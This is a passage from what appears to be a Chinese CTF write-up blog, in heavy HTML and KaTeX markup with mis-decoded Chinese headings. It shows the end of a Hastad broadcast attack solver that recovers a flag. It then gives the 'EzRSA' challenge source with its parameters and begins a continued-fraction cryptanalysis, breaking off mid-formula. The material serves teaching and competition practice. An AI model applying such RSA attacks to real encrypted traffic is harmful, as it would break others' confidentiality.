class="hljs-number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="hljs-number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="hljs-number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="hljs-number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="hljs-number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="hljs-number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="hljs-number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="hljs-number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]<br><span class="hljs-attribute">e</span>=<span class="hljs-number">9</span><br><span class="hljs-attribute">m</span>=crt(n_list,c_list)[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">print</span>(long_to_bytes(iroot(m,e)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment">#b&#x27;flag&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å¹¿ä¸œå¼ºç½‘æ¯-2021-ä¸ªäººç»„ezrsa"><a class="markdownIt-Anchor" href="#å¹¿ä¸œå¼ºç½‘æ¯-2021-ä¸ªäººç»„ezrsa"></a> [å¹¿ä¸œå¼ºç½‘æ¯ 2021 ä¸ªäººç»„]EzRSA</h1><h2 id="é¢˜ç›®-6"><a class="markdownIt-Anchor" href="#é¢˜ç›®-6"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> FLAG<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(FLAG)==<span class="hljs-number">47</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pub_key</span>(<span class="hljs-params">bit_n, bit_lucky</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">2</span>*bit_lucky &lt; bit_n<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        ran_num1, ran_num2 = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky)), randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky))<br>        g = ran_num1 * ran_num2 + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> isPrime(g):<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                ran_num3, ran_num4 = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky)), randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_n // <span class="hljs-number">2</span> - bit_lucky))<br>                j = ran_num1 * ran_num4 + <span class="hljs-number">1</span><br>                t = ran_num3 * ran_num4 + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> isPrime(j) <span class="hljs-keyword">and</span> isPrime(t):<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        e = randint(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky-<span class="hljs-number">1</span>),<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,bit_lucky))<br>                        <span class="hljs-keyword">if</span> gcd(e, ran_num1 * ran_num2 * ran_num3 * ran_num4) == <span class="hljs-number">1</span>:<br>                            phi = (g - <span class="hljs-number">1</span>) * (t - <span class="hljs-number">1</span>)<br>                            d = inverse(e, phi)<br>                            k = (e * d - <span class="hljs-number">1</span>) // phi<br>                            o = k * ran_num2 + <span class="hljs-number">1</span><br>                            <span class="hljs-keyword">if</span> isPrime(o):<br>                                n1, n2 = g * t, j * o<br>                                <span class="hljs-keyword">return</span> (e, n1, n2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, e,n</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(msg, e, n)<br><br>bit_n, bit_lucky = <span class="hljs-number">1024</span>, <span class="hljs-number">256</span><br><br>e, n1, n2 = get_pub_key(bit_n, bit_lucky)<br><br>FLAG = bytes_to_long(FLAG.encode())<br><br>c1 = encrypt(FLAG, e, n1)<br>c2 = encrypt(FLAG, e, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1 =&#x27;</span>, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n2 =&#x27;</span>, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1 =&#x27;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2 =&#x27;</span>, c2)<br><br><br><span class="hljs-comment">#e = 77493305850606946966866586869701562747566137421194857276849326558383863716599</span><br><span class="hljs-comment">#n1 = 38214712801044280452242029022307023900010505700133304226967361821658293768459754887223522190673421124166486124464596635967747405359806642464884601455285823454970604600165907209542618963333642882524596571019916658676095313436156240684679902251615046617153094607425987125749225956361360222801251450373042579071</span><br><span class="hljs-comment">#n2 = 11918534754165556595562303500191427316052163288557481525821438608864207524482981704928088272082867228651327063972728644192877335261376841505970220897803876176646736511250339814035116162036800063521023303060582016775080988747746487028664050144843952770605999675734459531886474293242344088869877433555271258269</span><br><span class="hljs-comment">#enc1 = 15808757304442558489652709164051631267713593320560967145595438513675108079906680505924179038743563463272753097766933667737349956243897214853643343110837736923623483907392474855188388096345292952323482631367759757699216716624973244377786699291503949070419765404840454938181818882998235566160193218211345167102</span><br><span class="hljs-comment">#enc2 = 6376686158682997059741103218078544724010800198504747162290763103690338182777916072489234933936183210135919268370502287963945937266836059808775864844630371956704383598114953698187649635431791980376016420776898290168916806683089572655387949425292390749405301644222442142567586889975355029412203353803624681004</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-6"><a class="markdownIt-Anchor" href="#åˆ†æ-6"></a> åˆ†æ</h2><blockquote><p>å‚è€ƒxennyå¸ˆå‚…çš„wp</p><p><a href="https://www.nssctf.cn/note/set/135">æ–‡ç« åˆ—è¡¨ | NSSCTF</a></p></blockquote><p>åˆ©ç”¨è¿åˆ†æ•°å¤„ç†</p><p>æœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>3</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>4</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">n_1=r_1*r_2*r_3*r_4+.....</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>2</mn></msub><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>3</mn></msub><mo>âˆ—</mo><mi>k</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">n_2=r_1*r_3*k*r_2+...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><msub><mi>n</mi><mn>2</mn></msub><msub><mi>n</mi><mn>1</mn></msub></mfrac><mo>â‰ˆ</mo><mfrac><mi>k</mi><msub><mi>r</mi><mn>3</mn></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{n_2}{n_1}â‰ˆ\frac{k}{r_3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20744em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>ç„¶åæœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>â‰¡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">kÏ†(n_1)+1\equiv0\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mo>âˆ’</mo><mi>k</mi><mi>r</mi><mo stretchy="false">)</mo><mo>â‰¡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">kÏ†(n_1)+(-kr)\equiv0\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>â‰¡</mo><mi>r</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Ï†(n_1)\equiv r\quad mod(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p><p>åˆæœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>â‰¡</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Ï†(n_1)\equiv0\quad mod(r_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" 